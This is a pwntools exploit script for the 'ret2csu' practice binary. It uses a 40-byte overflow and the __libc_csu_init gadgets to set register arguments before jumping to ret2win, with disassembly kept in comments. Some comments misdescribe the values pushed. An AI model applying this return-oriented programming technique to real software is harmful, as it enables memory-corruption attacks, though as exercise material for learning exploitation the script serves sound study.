from pwn import * 

context(terminal=['tmux','new-window'])
p = process("./ret2csu")
'''_libc_csu_init
        0040089a 5b              POP        RBX
        0040089b 5d              POP        RBP
        0040089c 41 5c           POP        R12
        0040089e 41 5d           POP        R13
        004008a0 41 5e           POP        R14
        004008a2 41 5f           POP        R15
        004008a4 c3              RET

'''
#gadget
gadgetcsu1= 0x40089a

'''
        00400880 4c 89 fa        MOV        param_3,R15  ->> param3=rdx
        00400883 4c 89 f6        MOV        param_2,R14		->> param2 = rsi
        00400886 44 89 ef        MOV        param_1,R13D	->> param1 = rdi
        00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy
resolv a pointer
        0040088d 48 83 c3 01     ADD        RBX,0x1
        00400891 48 39 dd        CMP        RBP,RBX
        00400894 75 ea           JNZ        LAB_00400880

'''


#search-pattern 0x400560 (_init)
resolvPtr = 0x600e38 	
gadgetcsu2= 0x400880
ret2win = 0x4007b1


payload = ''
payload += 'a'*40
payload += p64(gadgetcsu1) 
payload += p64(0x0)                  #RBX
payload += p64(0x1)                  #RBP need to be 0x1 to equal to RBX 0x40088d
payload += p64(resolvPtr)            #R12 need to point to a function that exist
payload += p64(0x0)                  #R13
payload += p64(0x0)                  #R14
payload += p64(0xdeadcafebabebeef)   #R15

payload += p64(gadgetcsu2)           #RET
payload += p64(0x0)                  #param_3=0xdeadcafebabebeef 
payload += p64(0x0)                  #param_2=0
payload += p64(0x0)                  #param_1=0 
payload += p64(0x0)                  #call qword 0x600e38 - in 0x600e38 its place the _init address
payload += p64(0x0)                  #RBX=0x1
payload += p64(0x0)                  #RBP=0x1 
payload += p64(0x0)                   

payload += p64(ret2win)           #ret2win(0,0,0xdeadcafebabebeef)


p.recvuntil("> ")
p.sendline(payload)
p.interactive()
